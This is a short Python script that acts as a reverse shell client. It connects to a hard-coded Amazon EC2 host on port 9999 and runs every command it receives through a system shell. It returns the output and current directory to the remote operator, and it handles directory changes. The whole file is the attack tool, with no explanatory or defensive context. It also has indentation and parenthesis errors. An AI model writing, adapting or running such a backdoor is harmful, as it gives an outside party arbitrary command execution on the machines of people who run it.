import socket
import os
import subprocess

s = socket.socket()
host = socket.gethostbyname("ec2-18-217-85-9.us-east-2.compute.amazonaws.com")
port = 9999

s.connect( (host, port) )

while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == "cd":
            try:
		os.chdir( data[3:].decode("utf-8") )
            except:
                cwd = os.getcwd() + ">"
                s.send( str.encode( "Invalid Directory\n"+ cwd  )

	if len(data) > 0:
		cmd = subprocess.Popen( data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE )
		output_byte = cmd.stdout.read() + cmd.stderr.read()
		output_string = str( output_byte, "utf-8" )
		cwd = os.getcwd() + ">"
		s.send( str.encode(output_string + cwd)  )
